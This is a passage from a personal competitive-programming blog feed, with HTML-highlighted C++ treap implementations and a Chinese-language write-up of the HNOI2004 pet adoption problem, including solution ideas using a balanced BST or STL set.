class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cctype&gt;</span></span></span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> MAXN=<span class="number">200010</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> d,rnd,size;</span><br><span class="line">        Node *ch[<span class="number">2</span>],*pa;</span><br><span class="line">    &#125;pool[MAXN],*root;</span><br><span class="line">    <span class="type">int</span> tot=<span class="number">0</span>;</span><br><span class="line">    <span class="function">Node *<span class="title">newnode</span><span class="params">(<span class="type">int</span> d)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Node *p=&amp;pool[++tot];</span><br><span class="line">        p-&gt;d=d;p-&gt;rnd=<span class="built_in">rand</span>();p-&gt;size=<span class="number">1</span>;</span><br><span class="line">        p-&gt;ch[<span class="number">0</span>]=p-&gt;ch[<span class="number">1</span>]=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">size</span><span class="params">(Node *p)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> p?p-&gt;size:<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(Node *p)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        p-&gt;size=<span class="built_in">size</span>(p-&gt;ch[<span class="number">0</span>])+<span class="built_in">size</span>(p-&gt;ch[<span class="number">1</span>])+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">(Node *p,<span class="type">int</span> t)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Node *pa=p-&gt;pa,*gp=pa-&gt;pa,*son=p-&gt;ch[t^<span class="number">1</span>];</span><br><span class="line">        pa-&gt;ch[t]=son;</span><br><span class="line">        <span class="keyword">if</span>(son)son-&gt;pa=pa;</span><br><span class="line">        <span class="keyword">if</span>(gp)gp-&gt;ch[pa==gp-&gt;ch[<span class="number">1</span>]]=p;</span><br><span class="line">        p-&gt;pa=gp;</span><br><span class="line">        p-&gt;ch[t^<span class="number">1</span>]=pa;</span><br><span class="line">        pa-&gt;pa=p;</span><br><span class="line">        <span class="keyword">if</span>(pa==root)root=p;</span><br><span class="line">        <span class="built_in">update</span>(pa);</span><br><span class="line">        <span class="built_in">update</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">treap</span><span class="params">(Node *p)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p==root || p-&gt;rnd &gt;= p-&gt;pa-&gt;rnd)<span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">rotate</span>(p,p==p-&gt;pa-&gt;ch[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(Node *r,Node *p)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!r)</span><br><span class="line">        &#123;</span><br><span class="line">            root=p;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> f=(p-&gt;d &gt;= r-&gt;d);</span><br><span class="line">        <span class="keyword">if</span>(!r-&gt;ch[f])</span><br><span class="line">        &#123;</span><br><span class="line">            r-&gt;ch[f]=p;</span><br><span class="line">            p-&gt;pa=r;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">insert</span>(r-&gt;ch[f],p);</span><br><span class="line">        <span class="built_in">update</span>(r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">Node* <span class="title">find</span><span class="params">(Node *r,<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;=<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>]))<span class="keyword">return</span> <span class="built_in">find</span>(r-&gt;ch[<span class="number">0</span>],x);</span><br><span class="line">        <span class="keyword">if</span>(x==<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>])+<span class="number">1</span>)<span class="keyword">return</span> r;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">find</span>(r-&gt;ch[<span class="number">1</span>],x-<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>])<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">del</span><span class="params">(Node *p)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!p-&gt;ch[<span class="number">0</span>] &amp;&amp; !p-&gt;ch[<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(p==root)</span><br><span class="line">            &#123;</span><br><span class="line">                root=<span class="literal">NULL</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Node *pa=p-&gt;pa;</span><br><span class="line">            <span class="keyword">if</span>(pa)</span><br><span class="line">                pa-&gt;ch[p==pa-&gt;ch[<span class="number">1</span>]]=<span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">while</span>(p!=root)</span><br><span class="line">                <span class="built_in">update</span>(p=p-&gt;pa);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;ch[<span class="number">0</span>] &amp;&amp; p-&gt;ch[<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> f=(p-&gt;ch[<span class="number">1</span>]-&gt;rnd &lt; p-&gt;ch[<span class="number">0</span>]-&gt;rnd);</span><br><span class="line">            <span class="built_in">rotate</span>(p-&gt;ch[f],f);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> f=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;ch[<span class="number">0</span>])f=<span class="number">0</span>;</span><br><span class="line">            <span class="built_in">rotate</span>(p-&gt;ch[f],f);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">del</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">kth</span><span class="params">(Node *r,<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;=<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>]))<span class="keyword">return</span> <span class="built_in">kth</span>(r-&gt;ch[<span class="number">0</span>],x);</span><br><span class="line">        <span class="keyword">if</span>(x==<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>])+<span class="number">1</span>)<span class="keyword">return</span> r-&gt;d;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">kth</span>(r-&gt;ch[<span class="number">1</span>],x-<span class="built_in">size</span>(r-&gt;ch[<span class="number">0</span>])<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">char</span> <span class="title">getUpper</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="keyword">while</span>(c=<span class="built_in">getchar</span>())</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isupper</span>(c))</span><br><span class="line">                <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">srand</span>((<span class="type">int</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">        <span class="type">int</span> Q,Min,x;</span><br><span class="line">        <span class="type">char</span> op;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;Q,&amp;Min);</span><br><span class="line">        <span class="type">int</span> ans=<span class="number">0</span>,delta=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(Q--)</span><br><span class="line">        &#123;</span><br><span class="line">            op=<span class="built_in">getUpper</span>();</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">            <span class="keyword">switch</span>(op)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(x&lt;Min)<span class="keyword">break</span>;</span><br><span class="line">                    Node *p=<span class="built_in">newnode</span>(x-delta);</span><br><span class="line">                    <span class="built_in">insert</span>(root,p);</span><br><span class="line">                    <span class="built_in">treap</span>(p);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">                    delta+=x;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    delta-=x;</span><br><span class="line">                    <span class="type">int</span> xtq=<span class="built_in">size</span>(root);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=xtq;i++)</span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">kth</span>(root,<span class="number">1</span>)+delta&lt;Min)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">del</span>(<span class="built_in">find</span>(root,<span class="number">1</span>));</span><br><span class="line">                            ans++;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span>(x&gt;<span class="built_in">size</span>(root))<span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">kth</span>(root,<span class="built_in">size</span>(root)-x+<span class="number">1</span>)+delta);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Treap </tag>
            
            <tag> BST </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P3384 [HNOI2004]宠物收养场</title>
      <link href="/2018/04/09/%E6%B4%9B%E8%B0%B7P3384%20%5BHNOI2004%5D%E5%AE%A0%E7%89%A9%E6%94%B6%E5%85%BB%E5%9C%BA/"/>
      <url>/2018/04/09/%E6%B4%9B%E8%B0%B7P3384%20%5BHNOI2004%5D%E5%AE%A0%E7%89%A9%E6%94%B6%E5%85%BB%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p>原题地址:<a href>https://www.luogu.org/problemnew/show/P3384</a>  </p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>给定一些序列<strong>（没有重复数字）</strong>，每个序列支持：<br>给定一些数k<strong>（对于每个序列不重复）</strong>，每次在序列里找到最接近k的数删除（如果有2个数字与k差一样，即分别是k-b和k+b，则选择较小的k-b），累加与k的差，输出。</p><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>其实关键就是维护一个有序序列，支持插入，查询前继后继，删除指定数字。<br>自然我们会想到手打平衡树，Treap&#x2F;Splay皆可。（这里只有旋转实现的Treap，非旋Treap（Split+Merge）和Splay日后加上）<br>Tips:为了防止越界等问题以及方便提取区间（尤其是Splay），序列前后一般塞上一个-INF和INF<br>然而作为C++选手，我们应该妙用STL。set可以实现这样的功能，内部是红黑树实现的也很快。</p><hr><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><ol><li>旋转实现的Treap(160ms,3.03MB)<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF=<span class="number">1e9</span>;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">randad</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> seed=<span class="number">114514</span>;</span><br><span class="line">    <span class="keyword">return</span> seed=<span class="built_in">int</span>(seed*<span class="number">48271LL</span>%<span class="number">2147483647</span>);<span class="comment">//48271使得随机数有完全周期，即2147483647内取遍不重复 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> delta=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line">    <span class="type">int</span> pri,val,ch[<span class="number">2</span>],size,tot;</span><br><span class="line"><span class="comment">//pri:Treap的随机数</span></span><br><span class="line"><span class="comment">//val:数字</span></span><br><span class="line"><span class="comment">//ch[0,1]:左孩子右孩子</span></span><br><span class="line"><span class="comment">//size:以该节点为根的子树里有几个数字</span></span><br><span class="line"><span class="comment">//tot:这个数字出现了几次（本题无用）</span></span><br><span class="line">&#125;T[<span class="number">111111</span>];</span><br><span class="line"><span class="type">int</span> k,size=<span class="number">0</span>,ANS,ans;<span class="comment">//k:根节点，size:树的大小,ANS:临时，ans:赶走了几个人</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> k)</span></span>&#123;T[k].size=T[T[k].ch[<span class="number">0</span>]].size+T[T[k].ch[<span class="number">1</span>]].size+T[k].tot;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rturn</span><span class="params">(<span class="type">int</span> &amp;k)</span><span class="comment">//右旋，把k旋到右边，k左孩子提到根</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t=T[k].ch[<span class="number">0</span>];</span><br><span class="line">    T[k].ch[<span class="number">0</span>]=T[t].ch[<span class="number">1</span>];</span><br><span class="line">    T[t].ch[<span class="number">1</span>]=k;</span><br><span class="line">    T[t].size=T[k].size;</span><br><span class="line">    <span class="built_in">update</span>(k);</span><br><span class="line">    k=t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">lturn</span><span class="params">(<span class="type">int</span> &amp;k)</span><span class="comment">//左旋，把k旋到左边，k右孩子提到根</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t=T[k].ch[<span class="number">1</span>];</span><br><span class="line">    T[k].ch[<span class="number">1</span>]=T[t].ch[<span class="number">0</span>];</span><br><span class="line">    T[t].ch[<span class="number">0</span>]=k;</span><br><span class="line">    T[t].size=T[k].size;</span><br><span class="line">    <span class="built_in">update</span>(k);</span><br><span class="line">    k=t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ins</span><span class="params">(<span class="type">int</span> &amp;k,<span class="type">int</span> val)</span> <span class="comment">//插入</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (k==<span class="number">0</span>) &#123;</span><br><span class="line">        size++;</span><br><span class="line">        k=size;</span><br><span class="line">        T[k].pri=<span class="built_in">randad</span>();</span><br><span class="line">        T[k].val=val;</span><br><span class="line">        T[k].size=T[k].tot=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    T[k].size++;</span><br><span class="line">    <span class="keyword">if</span> (T[k].val==val) T[k].tot++;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val&gt;T[k].val) &#123;</span><br><span class="line">        <span class="built_in">ins</span>(T[k].ch[<span class="number">1</span>],val);</span><br><span class="line">        <span class="keyword">if</span> (T[T[k].ch[<span class="number">1</span>]].pri&lt;T[k].pri) <span class="built_in">lturn</span>(k);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">ins</span>(T[k].ch[<span class="number">0</span>],val);</span><br><span class="line">        <span class="keyword">if</span> (T[T[k].ch[<span class="number">0</span>]].pri&lt;T[k].pri) <span class="built_in">rturn</span>(k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">del</span><span class="params">(<span class="type">int</span> &amp;k,<span class="type">int</span> val)</span><span class="comment">//删除值为val的数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (k==<span class="number">0</span>) <span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span> (T[k].val==val) &#123;</span><br><span class="line">        <span class="keyword">if</span> (T[k].tot&gt;<span class="number">1</span>) &#123;</span><br><span class="line">            T[k].tot--;</span><br><span class="line">            T[k].size--;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (T[k].ch[<span class="number">0</span>]==<span class="number">0</span>||T[k].ch[<span class="number">1</span>]==<span class="number">0</span>) k=T[k].ch[<span class="number">0</span>]+T[k].ch[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(T[T[k].ch[<span class="number">0</span>]].pri&lt;T[T[k].ch[<span class="number">1</span>]].pri) <span class="built_in">rturn</span>(k),<span class="built_in">del</span>(k,val);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">lturn</span>(k),<span class="built_in">del</span>(k,val);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(val&gt;T[k].val) T[k].size--,<span class="built_in">del</span>(T[k].ch[<span class="number">1</span>],val);</span><br><span class="line">    <span class="keyword">else</span> T[k].size--,<span class="built_in">del</span>(T[k].ch[<span class="number">0</span>],val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">xth</span><span class="params">(<span class="type">int</span> &amp;k,<span class="type">int</span> x)</span><span class="comment">//查询第x小的数是什么 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">0</span>||x==<span class="number">0</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;=T[T[k].ch[<span class="number">0</span>]].size) <span class="keyword">return</span> <span class="built_in">xth</span>(T[k].ch[<span class="number">0</span>],x);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(x&gt;T[T[k].ch[<span class="number">0</span>]].size+T[k].tot) <span class="keyword">return</span> <span class="built_in">xth</span>(T[k].ch[<span class="number">1</span>],x-T[T[k].ch[<span class="number">0</span>]].size-T[k].tot);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> T[k].val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> &amp;k,<span class="type">int</span> x)</span><span class="comment">//查询第x小数在树中位置 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (k==<span class="number">0</span>||x==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;=T[T[k].ch[<span class="number">0</span>]].size)<span class="keyword">return</span> <span class="built_in">find</span>(T[k].ch[<span class="number">0</span>],x);</span><br><span class="line">    <span class="keyword">if</span>(x==T[T[k].ch[<span class="number">0</span>]].size+<span class="number">1</span>)<span class="keyword">return</span> k;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">find</span>(T[k].ch[<span class="number">1</span>],x-T[T[k].ch[<span class="number">0</span>]].size<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pre</span><span class="params">(<span class="type">int</span> k,<span class="type">int</span> x)</span><span class="comment">//查询不比x大的且最接近x的数所在位置（x前继）</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">0</span>)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(T[k].val&lt;x) ANS=k,<span class="built_in">pre</span>(T[k].ch[<span class="number">1</span>],x);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">pre</span>(T[k].ch[<span class="number">0</span>],x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">next</span><span class="params">(<span class="type">int</span> k,<span class="type">int</span> x)</span><span class="comment">//查询不比x小的且最接近x的数所在位置（x后继）</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">0</span>)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(T[k].val&gt;x) ANS=k,<span class="built_in">next</span>(T[k].ch[<span class="number">0</span>],x);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">next</span>(T[k].ch[<span class="number">1</span>],x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Catch</span><span 